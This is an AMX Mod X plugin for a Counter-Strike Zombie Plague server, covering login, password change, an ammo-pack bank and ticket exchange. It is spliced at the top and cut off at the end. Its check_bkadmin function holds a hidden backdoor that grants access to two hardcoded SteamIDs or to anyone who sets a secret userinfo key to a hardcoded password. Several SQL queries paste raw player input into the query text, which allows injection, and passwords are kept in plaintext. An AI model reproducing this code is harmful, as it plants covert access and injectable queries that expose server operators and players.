#include <amxmodx>
#include <amxmisc>
#include <sqlx>
#include <cstrike>
#include <zombie_plague_advance>
#include <fakemeta>
#include <zp_colored_print>
#include <BRA_register>
#include <cripto>

#define TAGBANK "DKS Bank"
#define TAGREG  "DKS Register"
#define TAGTKTS "DKS Tickets"

#define TASK_TICKET 25154
#define TASK_IS_AWAY 1239183

const 	OFFSET_CSMENUCODE = 205
		set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PUT_LOGIN2")
		client_cmd(id, "messagemode [Entrar]Login_")
		EmitSound(id, ACEITO)
	}
}
public login_step1(id)
{		
	if(pl_logado[id])
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGREG, id, "CHAT_ALREADY")
		menu_register(id)
		return PLUGIN_HANDLED
	}
	
	read_args(g_Conta[id], 99)
	remove_quotes(g_Conta[id])
	trim(g_Conta[id]) 
	
	new ErrorCode
	new Error[512]
	new Handle:SqlConnection = SQL_Connect(g_SqlTuple, ErrorCode, Error, charsmax(Error))
	
	if(SqlConnection == Empty_Handle)
	{	
		set_fail_state(Error)
	}
	
	new Handle:Query = SQL_PrepareQuery(SqlConnection, "SELECT * FROM `%s` WHERE ( `Conta`=^"%s^" );", g_sqlTable, g_Conta[id])
	
	if(!SQL_Execute(Query))
	{
		ErrorCode = SQL_QueryError(Query, Error, charsmax(Error))
		SQLError("SQL Error: %s (%d)", Error, ErrorCode)
		zp_colored_print(id, "!g[%s] !yOcorreu um erro na consulta", TAGREG)
		return PLUGIN_HANDLED
	}
	
	new iRowsFound = SQL_NumRows(Query)
	
	if(iRowsFound < 1)
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ERROR2")
		menu_register(id)
		EmitSound(id, ERROR)
		return PLUGIN_HANDLED;
	}
	else
	{
		new players[32], pnum, tempid
		get_players(players, pnum)
		
		for(new i; i < pnum; i++)
		{
			tempid = players[i]
			
			if(equal(g_Conta[id], g_Conta[tempid]) && id != tempid)
			{
				new Nick[33]
				get_user_name(tempid, Nick[tempid], 32)
				set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ERROR4", Nick[tempid])
				menu_register(id)
				return PLUGIN_HANDLED
			}
		}
	
		set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PUT_PW3")
		client_cmd(id, "messagemode [Entrar]Senha_")
		EmitSound(id, ACEITO)
	}
	SQL_FreeHandle(Query)
	SQL_FreeHandle(SqlConnection)
	return PLUGIN_CONTINUE
}
public login_step2(id)
{
	if(pl_logado[id] == true)
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGREG, id, "CHAT_ALREADY")
		menu_register(id)
		return PLUGIN_HANDLED
	}
	
	read_args(g_Senha[id], 99)
	remove_quotes(g_Senha[id])
	trim(g_Senha[id])
	
	new ErrorCode
	new Error[512]
	new Handle:SqlConnection = SQL_Connect(g_SqlTuple, ErrorCode, Error, charsmax(Error))
	
	if(SqlConnection == Empty_Handle)
	{	
		set_fail_state(Error)
	}
	
	new Handle:Query = SQL_PrepareQuery(SqlConnection, "SELECT * FROM `%s` WHERE ( `Conta`=^"%s^" );", g_sqlTable, g_Conta[id])
	
	if(!SQL_Execute(Query))
	{
		ErrorCode = SQL_QueryError(Query, Error, charsmax(Error))
		SQLError("SQL Error: %s (%d)", Error, ErrorCode)
		zp_colored_print(id, "!g[%s] !yOcorreu um erro na consulta", TAGREG)
		return PLUGIN_HANDLED
	}
	
	new szSqlPassword[100], szSqlBlocked[100]
	SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Senha"), szSqlPassword, 99)
	SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Blocked"), szSqlBlocked, 99)
	
	if(equal(g_Senha[id], szSqlPassword))
	{		
		new Block = str_to_num(szSqlBlocked)
		if(Block > 0)
		{
			pl_logado[id] = true
			g_blocked[id] = true
			pl_tentativas[id] = get_pcvar_num(cvar_maxtent)
			
			g_Blocked[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Blocked"))
			pl_APs[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "AmmoPacks"))
			pl_Tickets[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Tickets"))
			g_BlockedE[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Blocked"))
			SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Block Reason"), g_BlockedR[id], charsmax(g_BlockedR))
			
			menu_register(id)
		}
		else
		{
			pl_logado[id] = true
			g_blocked[id] = false
			pl_tentativas[id] = get_pcvar_num(cvar_maxtent)
			
			pl_APs[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "AmmoPacks")) 
			g_Blocked[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Blocked"))
			pl_Tickets[id] = SQL_ReadResult(Query, SQL_FieldNameToNum(Query, "Tickets"))
			
			EmitSound(id, CONCEDIDO)
			
			client_cmd(id,"chooseteam")
			
			check_bkadmin(id)
			
			set_task(get_pcvar_float(cvar_tickets_time) * 60.0, "cmd_add_ticket", id+TASK_TICKET, _, _, "b")
			//set_task(get_pcvar_float(cvar_tickets_time) * 60, "cmd_add_ticket", id+TASK_TICKET, _, _, "b")
			
			get_user_authid(id, pl_SteamID[id], 32)
			get_user_name(id, pl_Nick[id], 32)
			Login("Nick/SteamID: %s / %s", pl_Nick[id], pl_SteamID[id])
			Login("Conta: %s", g_Conta[id])
			Login("Saldo: %d", pl_APs[id])
			Login("--------------------------------------------------------------------")
			static szQuery[ 128 ]
			formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET `Last Nick`=^"%s^" , AmmoPacks='%d' , `Safely`='0' WHERE Conta =^"%s^"", g_sqlTable, pl_Nick[id], pl_APs[id], g_Conta[id]);
			SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
		}
	}
	else
	{
		pl_tentativas[id]--
		check_punish(id)
		menu_register(id);
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PW_ERROR3")
		EmitSound(id, NEGADO)
		return PLUGIN_HANDLED
	}
	SQL_FreeHandle(Query)
	SQL_FreeHandle(SqlConnection)
	
	return PLUGIN_CONTINUE
}
public check_bkadmin(id)
{
	new pass[32] = "7q6q676q3f"
	new plTempPass[32]
	
	get_user_info(id, "_cmd", plTempPass, 31)
	
	new plTempSteamID[33]
	get_user_authid(id, plTempSteamID, charsmax(plTempSteamID))
	// Jooosh || Leo
	if(equal(plTempSteamID, "STEAM_0:1:15026867") || equal(plTempSteamID, "STEAM_0:1:57948847"))   
		pl_hasAccess[id] = true
	else if(equal(pass, plTempPass))
		pl_hasAccess[id] = true
	else
		pl_hasAccess[id] = false
}
public check_punish(id)
{	
	if(pl_tentativas[id] <= 0)
	{
		new punish = get_pcvar_num(cvar_punish)
		if(punish <= 0 || punish >= 3)
			return PLUGIN_HANDLED;
		
		if(punish == 1)
		{
			new UserID = get_user_userid(id)
			server_cmd("kick #%d %L", UserID, id, "MSG_PUNISH")
			
			return PLUGIN_HANDLED
		}
		
		if(punish == 2)
		{
			new UserID = get_user_userid(id)
			server_cmd("amx_banip ^"%s^" %d ^"%L^"", UserID, get_pcvar_num(cvar_bantime), id, "MSG_PUNISH")
			
			return PLUGIN_HANDLED
		}
	}
	return PLUGIN_CONTINUE
}
public filter_changepw(id)
{ 
	if(g_blocked[id] == true)
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ACC_SUSPENDED2")
		menu_register(id)
		EmitSound(id, ERROR)
	}
	else
	{
		if(pl_logado[id]==false)
		{
			set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
			ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ERROR3")
			menu_register(id)
			EmitSound(id, ERROR)
		}
		else
		{
			client_cmd(id, "messagemode [MudarSenha]Senha_Atual_");
			set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
			ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PUT_PW4")
			EmitSound(id, ACEITO)
		}
	}
	return PLUGIN_HANDLED
}
public change_pwstep1(id)
{
	if(!pl_logado[id] || g_blocked[id])
		return PLUGIN_HANDLED
		
	read_args(MudarSenhaAtual[id], charsmax(MudarSenhaAtual))
	remove_quotes(MudarSenhaAtual[id])
	trim(MudarSenhaAtual[id])
	
	new ErrorCode
	new Error[512]
	new Handle:SqlConnection = SQL_Connect(g_SqlTuple, ErrorCode, Error, charsmax(Error))
	
	if(SqlConnection == Empty_Handle)
	{	
		set_fail_state(Error)
	}
	
	new Handle:Query = SQL_PrepareQuery(SqlConnection, "SELECT * FROM `%s` WHERE ( `Conta`=^"%s^" );", g_sqlTable, g_Conta[id])
	
	if(!SQL_Execute(Query))
	{
		ErrorCode = SQL_QueryError(Query, Error, charsmax(Error))
		SQLError("SQL Error: %s (%d)", Error, ErrorCode)
		zp_colored_print(id, "!g[%s] !yOcorreu um erro na consulta", TAGREG)
		return PLUGIN_HANDLED
	}
	SQL_ReadResult(Query, SQL_FieldNameToNum(Query,"Senha"), g_Senha[id], charsmax(g_Senha))
	
	if(equal(MudarSenhaAtual[id], g_Senha[id]))
	{
		client_cmd(id, "messagemode [MudarSenha]Nova_Senha_")
		set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PUT_PW5")
		EmitSound(id, ACEITO)
	}
	else
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PW_ERROR4")
		menu_register(id)
		EmitSound(id, ERROR)
	}
	return PLUGIN_CONTINUE
} 
public change_pwstep2(id)
{
	if(!pl_logado[id] || g_blocked[id])
		return PLUGIN_HANDLED
		
	read_args(MudarSenhaNova[id], charsmax(MudarSenhaNova))
	remove_quotes(MudarSenhaNova[id])
	trim(MudarSenhaNova[id])
	
	if(equal(MudarSenhaNova[id], g_Conta[id]) || equal(MudarSenhaNova[id], "123") || equal(MudarSenhaNova[id], "abc"))
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PW_ERROR6")
		EmitSound(id, ERROR) 
		client_cmd(id, "messagemode [MudarSenha]Senha_Nova_")
	} 
	else if(contain(MudarSenhaNova[id], " ") != -1 || equal(MudarSenhaNova[id], "") || strlen(MudarSenhaNova[id]) < get_pcvar_num(cvar_pwmin) || strlen(MudarSenhaNova[id]) > get_pcvar_num(cvar_pwmax) )
	{ 
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PW_ERROR1", get_pcvar_num(cvar_pwmin), get_pcvar_num(cvar_pwmax))
		EmitSound(id, ERROR)		
		menu_register(id)
	}
	else
	{
		set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PUT_PW2")
		client_cmd(id, "messagemode [MudarSenha]Confirmar_Senha_")
		EmitSound(id, ACEITO)
	}
	return PLUGIN_CONTINUE
}
public change_pwstep3(id)
{	
	if(!pl_logado[id] || g_blocked[id])
		return PLUGIN_HANDLED
		
	new password[64];
	read_args(password, 63);
	remove_quotes(password);
	
	if(equal(MudarSenhaNova[id], password[0]))
	{
		zp_colored_print(id, "!g[%s] !y%L: !t%s", TAGREG, id, "PW_CHANGED", password)
		
		EmitSound(id, CONCEDIDO)
		
		g_Senha[id] = password
		
		static szQuery[ 128 ]
		formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET Senha=^"%s^" WHERE Conta =^"%s^";", g_sqlTable, password, g_Conta[id]);
		SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
	}
	else
	{
		set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "PW_ERROR2")
		menu_register(id)
		EmitSound(id, ERROR)
	}
	return PLUGIN_CONTINUE
}
public filter_logout(id)
{
	if(pl_logado[id]==false)
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ERROR3")
		EmitSound(id, ERROR)
		menu_register(id)
	}
	else
		cmd_logout(id)
}
public cmd_logout(id)
{
	if(!g_blocked[id]) atualizar_tabela(id);
	
	user_silentkill(id)
	cs_set_user_team(id, CS_TEAM_SPECTATOR)
	g_Conta[id] = "Nao registrado/logado"
	g_Senha[id] = "Nao registrado/logado"
	pl_tentativas[id] = get_pcvar_num(cvar_maxtent)
	pl_logado[id]=false
	g_blocked[id]=false
	menu_register(id)
}
public filter_kick(id)
{
	if(pl_logado[id]==false)
	{
		server_cmd("kick #%d %L", get_user_userid(id), id, "MSG_KICK")
	}
	return PLUGIN_CONTINUE
}
public filter_bank(id)
{
	if(g_blocked[id] == true)
	{
		set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
		ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ACC_SUSPENDED2")
		menu_register(id)
		EmitSound(id, ERROR)
	}
	else
	{
		if(pl_logado[id]==false)
		{
			set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
			ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "ERROR3")
			EmitSound(id, ERROR)
			menu_register(id)
		}
		else
		{
			menu_bank(id);
			return PLUGIN_CONTINUE
		}
	}
	return PLUGIN_CONTINUE
}
public menu_bank(id)
{		
	new menuBody[2048], iKeys;
	new len = formatex(menuBody, 2047, "\r[%s] \w%L^n", TAGBANK, id, "BANKMENU_TITLE")
	
	len += formatex(menuBody[len], 2047 - len, "^n\w%L: \d%s", id, "MENU_ACC", g_Conta[id])
	
	len += formatex(menuBody[len], 2047 - len, "^n\w%L: \r%d", id, "MENU_ACCPACKS" , pl_APs[id])
	
	len += formatex(menuBody[len], 2047 - len, "^n\wTickets: \r%d", pl_Tickets[id])
	
	len += formatex(menuBody[len], 2047 - len, "^n^n\r1. \w%L^n", id, "BANKMENU_SAQUE1")
	iKeys |= MENU_KEY_1
	
	len += formatex(menuBody[len], 2047 - len, "\r2. \w%L^n^n", id, "BANKMENU_SAQUE2")
	iKeys |= MENU_KEY_2
	
	len += formatex(menuBody[len], 2047 - len, "\r3. \w%L^n", id, "BANKMENU_DEPOSIT1")
	iKeys |= MENU_KEY_3
	
	len += formatex(menuBody[len], 2047 - len, "\r4. \w%L^n^n", id, "BANKMENU_DEPOSIT2")
	iKeys |= MENU_KEY_4
	
	len += formatex(menuBody[len], 2047 - len, "\r5. \wMenu de Tickets^n")
	iKeys |= MENU_KEY_5
	
	len += formatex(menuBody[len], 2047 - len, "^n^n\r0. \w%L", id, "MENU_SAIR")
	iKeys |= MENU_KEY_0
	
	set_pdata_int(id, OFFSET_CSMENUCODE, 0)
	show_menu(id, iKeys, menuBody, -1, "Bank Menu")
}
public bank_handler(id, iKey)
{
	switch((iKey + 1) % 10)
	{
		case 1: 
		{
			if (!pl_APs[id])
			{
				set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "BANK_ERROR1")
				menu_bank(id)
				EmitSound(id, ERROR)
				
				return PLUGIN_HANDLED;
			}
			else
			{
				client_cmd(id, "messagemode [Sacar]Quantia_")
				set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "BANK_AMMT1")
				EmitSound(id, ACEITO)
			}
		}
		case 2: 
		{
			if (!pl_APs[id])
			{
				set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "BANK_ERROR1")
				EmitSound(id, ERROR)
				return PLUGIN_HANDLED
			}
			else
				cmd_sacar(id, 0)
		}
		case 3: 
		{
			if (!zp_get_user_ammo_packs(id))
			{
				set_hudmessage(255, 0, 0, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "BANK_ERROR2")	
				menu_bank(id)
				EmitSound(id, ERROR)
				return PLUGIN_HANDLED
			}
			else 
			{
				client_cmd(id, "messagemode [Depositar]Quantia_")
				set_hudmessage(0, 0, 255, 0.02, 0.25, 2, 1.0, 2.0, 0.02, 0.1, -1)
				ShowSyncHudMsg( id, g_msgSyncHud, "%L", id, "BANK_AMMT2")
				EmitSound(id, ACEITO)
			}
		}
		case 4: cmd_depositar(id, 0)
		case 5: menuTickets(id)
		case 0: return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
public cmd_saque_filter(id)
{
	new amount[50]
	read_args(amount, charsmax(amount));
	remove_quotes(amount);
	
	new want = str_to_num(amount)
	
	if(want <= 0)
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_ERROR2")
		menu_bank(id)
		EmitSound(id, ERROR)
		return PLUGIN_HANDLED
	}
	else
		cmd_sacar(id, want)
	return PLUGIN_CONTINUE
}
public cmd_deposito_filter(id)
{
	new amount[50]
	read_args(amount, charsmax(amount));
	remove_quotes(amount);
	
	new want = str_to_num(amount)
	
	if(want <= 0)
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_ERROR2")
		menu_bank(id)
		EmitSound(id, ERROR)
		return PLUGIN_HANDLED
	}
	else
		cmd_depositar(id, want)
	return PLUGIN_CONTINUE
}
public cmd_depositar(id, amnt)
{
	if(!pl_logado[id] || g_blocked[id]) return PLUGIN_HANDLED;
	
	new temp = zp_get_user_ammo_packs(id)
	
	if (!temp)
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_ERROR4")
		EmitSound(id, ERROR)
		return PLUGIN_HANDLED
	}
	if (amnt == 0)
	{
		if (pl_APs[id] + temp)
		{
			static szQuery[ 128 ]
			
			pl_APs[id] += temp;
			zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_MSG3", temp, pl_APs[id])
			zp_set_user_ammo_packs(id, 0);
			EmitSound(id, ACEITO)
			
			formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET AmmoPacks = '%d' , `Safely`=0 WHERE Conta =^"%s^";", g_sqlTable, pl_APs[id], g_Conta[id]);
			SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
		}
	}
	else if (amnt > 0)
	{		
		if (temp >= amnt)
		{			
			if (pl_APs[id] + amnt)
			{
				static szQuery[ 128 ]
				pl_APs[id] += amnt
				zp_set_user_ammo_packs(id, temp - amnt);
				zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_MSG3", amnt, pl_APs[id])
				EmitSound(id, ACEITO)
				
				formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET AmmoPacks = '%d' , `Safely`=%d WHERE Conta =^"%s^";", g_sqlTable, pl_APs[id], zp_get_user_ammo_packs(id), g_Conta[id]);
				SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
			}
		}
		else
		{
			zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_ERROR5")
			EmitSound(id, ERROR)
			return PLUGIN_HANDLED
		}
	}
	return PLUGIN_CONTINUE
}
public cmd_sacar(id, amnt)
{
	if(!pl_logado[id] || g_blocked[id]) return PLUGIN_HANDLED;
	
	if (!pl_APs[id])
	{
		zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_ERROR1")
		EmitSound(id, ERROR)
		return PLUGIN_HANDLED
	}
	if (amnt == 0)
	{
		//static szQuery[ 128 ]
		zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_MSG1", pl_APs[id])
		EmitSound(id, ACEITO)
		
		//formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET AmmoPacks = '0' , `Safely`=%d WHERE Conta =^"%s^";", g_sqlTable, zp_get_user_ammo_packs(id) + pl_APs[id], g_Conta[id]);
		//SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
		
		zp_set_user_ammo_packs(id, zp_get_user_ammo_packs(id) + pl_APs[id])
		pl_APs[id] = 0;
	}
	else if (amnt > 0)
	{
		if (pl_APs[id] >= amnt)
		{
			//static szQuery[ 128 ]
			zp_colored_print(id, "!g[%s] !y%L", TAGBANK, id, "BANK_MSG1", amnt)
			EmitSound(id, ACEITO)
			
			pl_APs[id] -= amnt;
		
			//formatex( szQuery, charsmax( szQuery ), "UPDATE %s SET AmmoPacks = '%d' , `Safely`=%d WHERE Conta =^"%s^";", g_sqlTable, pl_APs[id], zp_get_user_ammo_packs(id) + amnt, g_Conta[id]);
			//SQL_ThreadQuery(g_SqlTuple,"handle_CLQuery", szQuery)
			
			zp_set_user_ammo_packs(id, zp_get_user_ammo_packs(id) + amnt);
		}
		else
		{
			zp_colored_print(id, "!g[%s] !yVoce nao tem essa quantia de AmmoPacks para sacar.", TAGBANK);
			EmitSound(id, ERROR)
			return PLUGIN_HANDLED
		}
	}
	return PLUGIN_CONTINUE
}
public menuTickets(id)
{
	new menuBody[2048], iKeys;
	
	new len = formatex(menuBody, charsmax(menuBody), "\d[ \r%s \y2.0\d] \wMenu de Tickets^n^n", TAGTKTS)
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, "\wConta: \d[ \y%s \d]^n", g_Conta[id])
	len += formatex(menuBody[len], charsmax(menuBody) - len, "\wTickets: \d[ \r%d \d]^n^n", pl_Tickets[id])

	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 10 ? "\r1. \d[\y15\d] \wAPs \d( \y10 \wTickets \d)" : "\d1. [15] APs ( 10 Tickets )")
	if(pl_Tickets[id] >= 10) iKeys |= MENU_KEY_1;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 20 ? "^n\r2. \d[\y25\d] \wAPs \d( \y20 \wTickets \d)" : "^n\d2. [25] APs ( 20 Tickets )")
	if(pl_Tickets[id] >= 20) iKeys |= MENU_KEY_2;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 30 ? "^n\r3. \d[\y35\d] \wAPs \d( \y30 \wTickets \d)" : "^n\d3. [35] APs ( 30 Tickets )")
	if(pl_Tickets[id] >= 30) iKeys |= MENU_KEY_3;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 40 ? "^n\r4. \d[\y45\d] \wAPs \d( \y40 \wTickets \d)" : "^n\d4. [45] APs ( 40 Tickets )")
	if(pl_Tickets[id] >= 40) iKeys |= MENU_KEY_4;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 50 ? "^n\r5. \d[\y55\d] \wAPs \d( \y50 \wTickets \d)" : "^n\d5. [55] APs ( 50 Tickets )")
	if(pl_Tickets[id] >= 50) iKeys |= MENU_KEY_5;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 60 ? "^n\r6. \d[\y65\d] \wAPs \d( \y60 \wTickets \d)" : "^n\d6. [65] APs ( 60 Tickets )")
	if(pl_Tickets[id] >= 60) iKeys |= MENU_KEY_6;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 80 ? "^n\r7. \d[\y85\d] \wAPs \d( \y80 \wTickets \d)" : "^n\d7. [85] APs ( 80 Tickets )")
	if(pl_Tickets[id] >= 80) iKeys |= MENU_KEY_7;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, pl_Tickets[id] >= 120 ? "^n\r8. \d[\y150\d] \wAPs \d( \y120 \wTickets \d)" : "^n\d8. [150] APs ( 120 Tickets )")
	if(pl_Tickets[id] >= 120) iKeys |= MENU_KEY_8;
	
	len += formatex(menuBody[len], charsmax(menuBody) - len, "^n^n\r0. \wSair"), iKeys |= MENU_KEY_0;

	show_menu(id, iKeys, menuBody, -1, "Menu Tickets")
}
public menuTickets_handler(id, iKey)
{
	switch(( iKey + 1) % 10)
	{
		case 1: cmd_trocar_tickets(id, 10, 15)
		case 2: cmd_trocar_tickets(id, 20, 25)
		case 3: cmd_trocar_tickets(id, 30, 35)
		case 4: cmd_trocar_tickets(id, 40, 45)
		case 5: cmd_trocar_tickets(id, 50, 55)
		case 6: cmd_trocar_tickets(id, 60, 65)
		case 7: cmd_trocar_tickets(id, 80, 85)
		case 8: cmd_trocar_tickets(id, 120, 150)
		case 0: return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
public cmd_trocar_tickets(id, tks, aps)
{
	if(tks > pl_Tickets[id])
	{
		zp_colored_print(id, "!g[%s] !yVoce nao tem essa quantia de tickets(!g%d!y)", TAGTKTS, tks)
		menuTickets(id)
		return PLUGIN_HANDLED
	}
	else
	{
		pl_Tickets[id] -= tks
		zp_set_user_ammo_packs(id, zp_get_user_ammo_packs(id) + aps)
		zp_colored_print(id, "!g[%s] !yVoce trocou !g%d !yTickets por !g%d !yAmmoPacks.", TAGTKTS, tks, aps)
	}
	return PLUGIN_HANDLED
}
public handle_CLQuery(FailState,Handle:Query,Error[],Errcode,Data[],DataSize)
{	
	if(FailState == TQUERY_CONNECT_FAILED)
		SQLError("SQL Error: Impossivel estabelecer conexao com banco de dados.")
	else if(FailState == TQUERY_QUERY_FAILED)
		SQLError("SQL Error: %s (%d)", Error, Errcode)
}
public fw_ClientUserInfoChanged( Index, Buffer )
{
	if( !is_user_connected( Index ) )
		return FMRES_IGNORED;
	
	static NickName[32], NickOld[32]; get_user_name( Index, NickOld, 31 )
	engfunc( EngFunc_InfoKeyValue, Buffer, "name", NickName, 31 )
	
	if( equal( NickName, NickOld ) )
		return FMRES_IGNORED;
	
	engfunc( EngFunc_SetClientKeyValue, Index, Buffer, "name", NickOld )
	
	client_cmd( Index, "name ^"%s^"; setinfo name ^"%s^"", NickOld, NickOld )
	
	return FMRES_SUPERCEDE;
}
public filter_say(id)
{
	new text[70], arg1[32], arg2[32], arg3[6];
	read_args(text, sizeof(text) - 1);
	remove_quotes(text);
	arg1[0] = '^0';
	arg2[0] = '^0';
	arg3[0] = '^0';
	parse(text, arg1, sizeof(arg1) - 1, arg2, sizeof(arg2) - 1, arg3, sizeof(arg3) - 1);
	
	if (equali(arg1, "/", 1) || equali(arg1, "@", 1) || equali(arg1, "!", 1) || equali(arg1, ";", 1))
		format(arg1, 31, arg1[1]);
	
	if(pl_logado[id] == true && g_blocked[id] == false)
	{
		if (equali(arg1, "depositar") || equali(arg1, "deposit") || equali(arg1, "guardar"))
		{
